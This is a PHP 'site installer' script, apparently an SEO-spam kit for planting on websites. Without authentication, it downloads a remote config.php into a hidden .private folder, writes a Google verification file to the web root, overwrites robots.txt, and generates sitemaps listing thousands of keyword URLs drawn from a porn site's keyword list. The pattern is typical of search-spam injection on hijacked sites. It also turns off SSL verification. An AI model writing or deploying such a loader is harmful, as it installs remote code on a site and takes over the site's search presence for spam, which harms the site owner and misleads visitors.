<?php
date_default_timezone_set('Asia/Jakarta');
@set_time_limit(300); // 5 menit untuk semua operasi

// --- [KONFIGURASI DASAR] ---
$self_script_name = basename($_SERVER['PHP_SELF']);
$server_path = dirname(__FILE__);

// Logika domain
$host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
$clean_host = str_replace('www.', '', $host);

// URL Download
$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php';
$google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
$base_keyword_url_path = 'https://player.javpornsub.net/keyword/';
$base_content_url_path = 'https://player.javpornsub.net/content/';

// Path Penyimpanan
$cache_dir = $server_path . '/.private';
$local_config_path = $cache_dir . '/config.php';
$local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
$local_robots_path = $server_path . '/robots.txt';
$local_sitemap_path = $server_path . '/sitemap.xml'; // Ini akan jadi sitemap index

// --- [FUNGSI HELPER] ---

/**
 * Fungsi fetchFromUrl (Untuk Keyword TXT)
 */
function fetchKeywordsFromUrl($url, $default = []) { 
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
 
    if ($content !== false) {
        // Mengubah string (dengan baris baru) menjadi array
        $lines = array_filter(array_map('trim', explode("\n", $content)), 'strlen');
        if (!empty($lines)) {
            return $lines;
        }
    }
    return $default;
}

/**
 * Fungsi fetchRawUrl (Untuk download config.php & google.html)
 */
function fetchRawUrl($url) {
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    return $content;
}

/**
 * Fungsi buat_robots_txt
 */
function buat_robots_txt($domain) {
    global $local_robots_path;
    $sitemapUrl = 'https://' . $domain . '/sitemap.xml';
    $robotsContent = "User-agent: *\nAllow: /\n\nSitemap: $sitemapUrl\n";
    if (@file_put_contents($local_robots_path, $robotsContent)) {
        return true;
    }
    return false;
}

// --- [FUNGSI UTAMA] ---

/**
 * Menjalankan semua tugas instalasi
 */
function jalankan_instalasi() {
    global $clean_host, $cache_dir, $server_path, $self_script_name,
           $config_url, $local_config_path, $base_keyword_url_path, $base_content_url_path,
           $local_sitemap_path, $google_html_url, $local_google_path; // Menambahkan var Google HTML

    // 1. Ambil input dari form
    if (!isset($_GET['json_file']) || empty(trim($_GET['json_file'])) || !isset($_GET['txt_file']) || empty(trim($_GET['txt_file']))) {
        header('Location: ' . $self_script_name);
        exit;
    }
    
    $json_filename = trim($_GET['json_file']);
    if (substr($json_filename, -5) !== '.json') $json_filename .= '.json';
    $derived_content_url = $base_content_url_path . $json_filename;

    $txt_filename = trim($_GET['txt_file']);
    if (substr($txt_filename, -4) !== '.txt') $txt_filename .= '.txt';
    $derived_keyword_url = $base_keyword_url_path . $txt_filename;

    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memulai proses instalasi untuk ' . htmlspecialchars($clean_host)]
    ];

    // 2. Buat folder .private
    if (!is_dir($cache_dir)) {
        if (!@mkdir($cache_dir, 0755, true)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal membuat folder .private. Periksa izin folder root.'];
            tampilkan_log_terminal($logs, 'final_error'); 
            return false;
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'Folder .private sudah ada.'];
    }

    // 3. Unduh dan Modifikasi config.php
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php dari GitHub...'];
    $config_content = fetchRawUrl($config_url);
    
    if ($config_content !== false && !empty($config_content)) {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Template config.php berhasil diunduh.'];
        
        // Modifikasi 1: $content_url
        $config_content_mod = preg_replace(
            "/\\\$content_url = '.*';/i",
            "\$content_url = " . var_export($derived_content_url, true) . ";",
            $config_content
        );
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set $content_url ke: ' . htmlspecialchars($derived_content_url)];

        // (Blok modifikasi User-Agent sengaja dihapus sesuai permintaan)

        // Simpan file config.php yang sudah dimodifikasi
        if (@file_put_contents($local_config_path, $config_content_mod)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan di: .private/config.php'];
        } else {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan config.php. Periksa izin folder .private.'];
        }

    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh config.php. Proses dibatalkan.'];
        tampilkan_log_terminal($logs, 'final_error');
        return false;
    }

    // 4. Unduh Google HTML
    $google_file_name = basename($local_google_path);
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh ' . $google_file_name . '...'];
    $google_content = fetchRawUrl($google_html_url);
    if ($google_content !== false && !empty($google_content)) {
        if (@file_put_contents($local_google_path, $google_content)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan di root.'];
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan ' . $google_file_name . '. Periksa izin root.'];
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh ' . $google_file_name . '.'];
    }
    
    // 5. Buat robots.txt
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat robots.txt...'];
    if (buat_robots_txt($clean_host)) {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt berhasil dibuat di root.'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat robots.txt.'];
    }
    
    // 6. Buat Sitemap
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh keywords dari: ' . htmlspecialchars($derived_keyword_url)];
    $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
    
    if (empty($keywords)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh keywords atau file TXT kosong. Sitemap tidak akan dibuat.'];
         tampilkan_log_terminal($logs, 'final_error');
         return false;
    }

    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Ditemukan ' . count($keywords) . ' keywords. Mulai membuat sitemap...'];

    $total_keywords = count($keywords);
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $base_url = $protocol . $clean_host;
    $now = date('Y-m-d\TH:i:s+07:00');
    
    $urls_per_map = 10000; // Batas 10rb URL per sitemap
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengatur batas ' . $urls_per_map . ' URL per file sitemap.'];

    $num_maps = ceil($total_keywords / $urls_per_map);
    if ($num_maps == 0) $num_maps = 1;

    for ($i = 1; $i <= $num_maps; $i++) {
        $sitemap_file = 'sitemap-' . $i . '.xml';
        $sitemap_path_sub = $server_path . '/' . $sitemap_file;
        $offset = ($i - 1) * $urls_per_map;
        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);
        
        $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        
        // URL Halaman utama (index.php)
        $xml_sub .= '  <url><loc>' . $base_url . '/index.php' . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;

        foreach ($keywords_chunk as $keyword) {
            // Menggunakan format URL /index.php?id=keyword
            $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword));
            $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
        }
        $xml_sub .= '</urlset>' . PHP_EOL;
        @file_put_contents($sitemap_path_sub, $xml_sub);
    }
    
    // Buat Sitemap Index (sitemap.xml)
    $xml_index = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $xml_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    for ($i = 1; $i <= $num_maps; $i++) {
        $map_url = $base_url . '/sitemap-' . $i . '.xml';
        $xml_index .= '  <sitemap><loc>' . htmlspecialchars($map_url) . '</loc><lastmod>' . $now . '</lastmod></sitemap>' . PHP_EOL;
    }
    $xml_index .= '</sitemapindex>' . PHP_EOL;
    @file_put_contents($local_sitemap_path, $xml_index);
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index (sitemap.xml) dan $num_maps sub-sitemap (sitemap-*.xml) dibuat."];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];

    // Selesai, tampilkan log terakhir
    tampilkan_log_terminal($logs, 'done');
}


/**
 * Fungsi untuk menampilkan UI Terminal dengan log
 * $next_action: 'done', 'final_error'
 */
function tampilkan_log_terminal($logs, $next_action = 'done') {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">loader.php (Site Installer)</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
            </div>
        </div>
    <script>
        const logs = ' . json_encode($logs) . ';
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;

        function typeNextChar() {
            if (currentLog >= logs.length) {
                // Semua log selesai, tampilkan prompt akhir
                container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                return;
            }
            
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent += log.message[currentChar];
                currentChar++;
                setTimeout(typeNextChar, 8);
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 50);
            }
        }
        setTimeout(typeNextChar, 200);
    </script>
    </body></html>';
}


// --- [ROUTER UTAMA] ---

// Jika form disubmit, jalankan instalasi
if (isset($_GET['action']) && $_GET['action'] === 'install') {
    jalankan_instalasi();
    exit;
} 

// Halaman default (Tampilan "Installer" dengan Form Input)
else {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
        
        .input-form { 
            margin-top: 20px; 
            display: none;
            background: #1a1a1a;
            padding: 15px;
            border: 1px solid #333;
        }
        .input-form .form-group {
            margin-bottom: 12px;
        }
        .input-form label {
            display: block;
            margin-bottom: 8px;
            color: #0095ff;
        }
        .input-form input[type="text"] {
            width: 100%;
            padding: 10px;
            background: #222;
            border: 1px solid #444;
            color: #fff;
            font-family: inherit;
            font-size: 11px;
            box-sizing: border-box;
        }
        .input-form button {
            display: block;
            width: 100%;
            margin-top: 15px;
            padding: 10px;
            background: #28ca42;
            border: none;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            font-family: inherit;
            font-size: 12px;
        }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">system.installer</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
                
                <form method="GET" action="' . $self_script_name . '" class="input-form" id="jsonForm">
                    <input type="hidden" name="action" value="install">
                    
                    <div class="form-group">
                        <label for="json_file">1. Masukkan Nama File JSON (untuk Konten):</label>
                        <input type="text" id="json_file" name="json_file" placeholder="contoh: english.json" required>
                    </div>

                    <div class="form-group">
                        <label for="txt_file">2. Masukkan Nama File TXT (untuk Keywords):</label>
                        <input type="text" id="txt_file" name="txt_file" placeholder="contoh: eng.txt" required>
                    </div>

                    <button type="submit">MULAI PROSES INSTALASI</button>
                </form>

            </div>
        </div>
        <script>
            const installLogs = [
                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai instalasi..."},
                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Mendeteksi domain: ' . $clean_host . '"},
                {timestamp: "' . date('H:i:s') . '", type: "success", message: "Verifikasi sistem berhasil"},
                {timestamp: "' . date('H:i:s') . '", type: "warning", message: "Menunggu input..."}
            ];

            const container = document.getElementById("logsContainer");
            let currentLog = 0; let currentChar = 0; let currentLine = null;
            
            function typeNextChar() {
                if (currentLog >= installLogs.length) {
                    document.getElementById("jsonForm").style.display = "block";
                    document.getElementById("json_file").focus();
                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                    return;
                }
                
                const log = installLogs[currentLog];
                if (currentChar === 0) {
                    currentLine = document.createElement("div");
                    currentLine.className = "log-entry";
                    currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                    container.appendChild(currentLine);
                }
                const messageElement = currentLine.querySelector(".typing");
                if (currentChar < log.message.length) {
                    messageElement.textContent += log.message[currentChar];
                    currentChar++;
                    setTimeout(typeNextChar, 8);
                } else {
                    messageElement.classList.remove("typing");
                    currentChar = 0;
                    currentLog++;
                    setTimeout(typeNextChar, 50);
                }
            }
            setTimeout(typeNextChar, 200);
        </script>
    </body>
    </html>';
}
?>
